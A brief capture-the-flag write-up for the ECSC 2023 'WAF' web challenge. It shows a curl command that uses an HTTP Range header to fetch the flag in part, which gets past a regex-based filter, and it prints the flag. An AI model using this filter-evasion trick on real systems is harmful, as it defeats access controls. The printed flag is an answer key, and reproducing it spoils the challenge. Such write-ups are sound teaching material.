# [web - WAF](https://hack.cert.pl/challenge/waf)

Since the regex pattern is `ecsc23{\\w+}` we can simply set bytes range to remove known part of the flag:
```bash
curl "https://waf.ecsc23.hack.cert.pl/flag" -H "range: bytes=6-45"

# {waf_stands_for_very_accessible_flag}
```

### Flag
```
ecsc23{waf_stands_for_very_accessible_flag}
```
